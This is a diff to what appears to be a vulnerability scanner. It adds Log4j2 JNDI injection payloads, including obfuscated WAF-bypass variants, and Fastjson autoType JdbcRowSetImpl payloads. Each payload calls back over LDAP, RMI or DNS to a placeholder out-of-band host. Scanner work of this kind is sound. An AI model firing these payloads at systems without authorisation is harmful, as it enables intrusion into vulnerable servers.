@@ -201,9 +201,15 @@ class Log4ShellEngine(BaseEngine):
             payload_templates=[
                 "${jndi:dns://{OBS_DNS}}",
                 "${jndi:ldap://{OBS_DNS}/a}",
+                "${jNdI:ldap://{OBS_DNS}/a}",
+                "${jndi:rmi://{OBS_DNS}/a}",
+                "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{OBS_DNS}/a}",
+                "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://{OBS_DNS}/a}",
+                "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{OBS_DNS}/a}",
+                "${:-${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{OBS_DNS}/a}",
             ],
             type_label='Log4j2 JNDI 注入',
-            evidence_note='注入 ${jndi:*} 后命中 OOB（触发服务端 JNDI 查询）',
+            evidence_note='注入 ${jndi:*}（含 WAF 绕过变体）后命中 OOB（触发服务端 JNDI 查询）',
             recommendation='升级 Log4j2 至 2.17.1+，禁用 JNDI Lookup',
         )
         return None
@@ -281,7 +287,10 @@ class FastjsonDeserializationEngine(BaseEngine):
             engine_name=self.name, url=url, param=param, parsed_query=parsed_query, session=session,
             payload_templates=[
                 '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{OBS_DNS}/a","autoCommit":true}',
+                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{OBS_DNS}/a","autoCommit":true}',
+                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"dns://{OBS_DNS}/a","autoCommit":true}',
                 '{"@type":"java.net.Inet4Address","val":"{OBS_DNS}"}',
+                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{OBS_DNS}","autoCommit":true}',
             ],
             type_label='Fastjson JNDI 注入',
             evidence_note='注入 autoType 外带载荷后命中 OOB（触发 JdbcRowSetImpl/Inet4Address 回调）',
